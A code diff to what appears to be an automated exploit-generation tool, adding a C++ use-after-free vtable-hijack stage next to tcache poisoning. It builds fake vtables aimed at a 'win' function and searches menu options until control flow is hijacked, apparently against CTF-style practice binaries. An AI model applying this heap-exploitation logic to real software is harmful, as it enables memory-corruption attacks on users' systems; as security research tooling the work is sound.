@@ -172,6 +172,19 @@ def chain_primitive_stage(ctx) -> dict:
         capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
         try:
             if vclass in ("double_free", "uaf"):
+                # C++ UAF -> vtable hijack: overwrite the freed object's vtable pointer with an
+                # inline fake table so the dangling virtual call dispatches to win. Tried first for a
+                # C++ target, whose empty menu crawl gives tcache-poison's role lookup nothing.
+                vt = _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
+                                     model, width, workdir, capture)
+                if vt:
+                    seq, new_o, free_o, edit_o, show_o, chunk, size = vt
+                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
+                                    blame=(f"UAF vtable hijack: option {edit_o} overwrites the freed "
+                                           f"object's vtable pointer (inline fake table at "
+                                           f"{hex(chunk + 8)}), option {show_o}'s virtual call "
+                                           f"dispatches to &{win_name}"),
+                                    writer=edit_o, off=None, trig=show_o, exe=exe)
                 # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                 tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                    model, width, workdir, capture)
@@ -487,11 +500,12 @@ def _writable_globals(exe) -> list[int]:
     return sorted(seen)[:12]
 
 
-def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
-    """Run the drive under the heaptrace ptrace helper and return the FIRST chunk address it
-    allocates (deterministic under ASLR-off) -- the value the safe-linking fd mangle needs. Runs the
-    helper DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap
-    layout matches the capture() runs the exploit is confirmed under."""
+def _trace_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> tuple:
+    """Run the drive under the heaptrace ptrace helper and return the FIRST allocation as
+    (chunk_address, requested_size), or (None, None). Deterministic under ASLR-off. Runs the helper
+    DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap layout
+    matches the capture() runs the exploit is confirmed under -- and so a C++ target (whose bwrap
+    sandbox may lack libstdc++) is still traced."""
     import json
 
     from ..dynamic import heap_discover
@@ -509,10 +523,19 @@ def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> in
     try:
         ctx.run_subprocess([sys.executable, str(helper), str(workdir / "aspec.json"),
                             str(report)], timeout=12)
-        addrs = json.loads(report.read_text()).get("alloc_addrs") or []
+        rep = json.loads(report.read_text())
+        addrs, sizes = rep.get("alloc_addrs") or [], rep.get("alloc_sizes") or []
     except Exception:
-        return None
-    return int(addrs[0], 16) if addrs else None
+        return None, None
+    if not addrs:
+        return None, None
+    return int(addrs[0], 16), (int(sizes[0]) if sizes else None)
+
+
+def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
+    """The FIRST chunk address a drive allocates (the safe-linking fd mangle needs it); size-less
+    wrapper over _trace_alloc for the tcache-poison caller."""
+    return _trace_alloc(ctx, exe, alloc_info, drive, width, workdir)[0]
 
 
 def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
@@ -578,6 +601,93 @@ def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, m
                     ctx.progress(msg=f"tcache-poison: chunk over {hex(tgt)} -> {win_name} "
                                      f"(size {size}, trigger {trig})")
                     return seq, tgt, trig
+    return None
+
+
+def _is_cpp_heap(target_bytes) -> bool:
+    """The target allocates C++ objects: its PLT imports `operator new` AND `operator delete`
+    (_Znwm/_Znam paired with _ZdlPv*/_ZdaPv*). A polymorphic such object carries a vtable pointer at
+    offset 0 -- the thing a use-after-free lets us overwrite."""
+    from . import rop
+    got = rop.got_entries(target_bytes)
+    return (any(n in got for n in ("_Znwm", "_Znam"))
+            and any(n in got for n in ("_ZdlPv", "_ZdlPvm", "_ZdaPv", "_ZdaPvm")))
+
+
+def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
+                    workdir, capture):
+    """C++ use-after-free -> vtable hijack. A freed polymorphic object keeps a dangling reference; a
+    later write reclaims (or writes straight through) the chunk and replaces its vtable POINTER
+    (object offset 0), so the next virtual call dispatches through an attacker vtable to win.
+
+    The reclaimed chunk address is deterministic under ASLR-off, so we build the fake vtable INLINE
+    in the object: offset 0 -> chunk+8, and every following word -> win. A virtual call
+    `mov rax,[obj]; call [rax+N]` then reads vtable=chunk+8 and calls *(chunk+8+N)=win for every
+    small N -- no leak and no fixture gadget needed. The menu crawl is empty for a C++ target (its
+    bwrap sandbox may lack libstdc++), so roles are SEARCHED, not read from the model: probe which
+    option allocates (new), then permute the rest as (free, edit, show) and confirm the win
+    breakpoint is hit AND a negative control (fake vtable -> a benign address) is NOT. Returns
+    (seq, new_opt, free_opt, edit_opt, show_opt, chunk, size) or None. Non-PIE."""
+    from ..dynamic import heap_discover
+    from ..fuzz import menu
+    from . import exploit
+    if not _is_cpp_heap(target_bytes):
+        return None
+    alloc_info = heap_discover._libc_plt_pair(exe)
+    if not alloc_info:
+        return None
+    win_name, win_addr = win
+
+    # candidate roles: index-taking options (fall back to every option when the crawl learned none).
+    cand = [o for o in opts if o in model and "idx" in model[o]] or list(opts)
+    cand = [o for o in cand if o != "0"][:6]
+    if len(cand) < 2:
+        return None
+
+    def _op(opt, idx=0):                                  # select `opt`, supply index `idx`
+        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)
+
+    # Identify the allocating option(s) by tracing each candidate's drive once (cached).
+    allocs: dict = {}
+    for opt in cand:
+        if ctx.should_cancel():
+            return None
+        addr, size = _trace_alloc(ctx, exe, alloc_info, _op(opt, 0), width, workdir)
+        if addr:
+            allocs[opt] = (addr, size or 32)
+    if not allocs:
+        return None
+
+    attempts = 0
+    for new_opt, (chunk, size) in allocs.items():
+        size = max(16, min(size, 4096)) & ~0x7            # object size: edit read() consumes exactly
+        # fake vtable built inline in the reclaimed object: ptr at off 0 -> chunk+8, slots all win
+        vtable = _p64(chunk + 8) + _p64(win_addr) * ((size - 8) // 8)
+        vtable = vtable[:size].ljust(size, b"\x00")
+        benign = _p64(chunk + 8) + _p64(win_addr ^ 0xFFFF) * ((size - 8) // 8)
+        benign = benign[:size].ljust(size, b"\x00")
+        others = [o for o in cand if o != new_opt]
+        for free_opt in others:
+            for edit_opt in others:
+                if edit_opt == free_opt:
+                    continue
+                for show_opt in others:
+                    if show_opt in (free_opt, edit_opt) or ctx.should_cancel() or attempts >= 200:
+                        if attempts >= 200:
+                            return None
+                        continue
+                    attempts += 1
+                    body = (_op(new_opt, 0) + _op(free_opt, 0)
+                            + _op(edit_opt, 0) + vtable + _op(show_opt, 0))
+                    if not exploit.reached(capture(body, breakpoints=[win_addr]), win_addr):
+                        continue
+                    neg = (_op(new_opt, 0) + _op(free_opt, 0)
+                           + _op(edit_opt, 0) + benign + _op(show_opt, 0))
+                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
+                        continue                          # reached without our vtable -> not ours
+                    ctx.progress(msg=f"C++ UAF vtable hijack: new {new_opt}/free {free_opt}/edit "
+                                     f"{edit_opt}/call {show_opt} -> fake vtable -> {win_name}")
+                    return body, new_opt, free_opt, edit_opt, show_opt, chunk, size
     return None
 
 
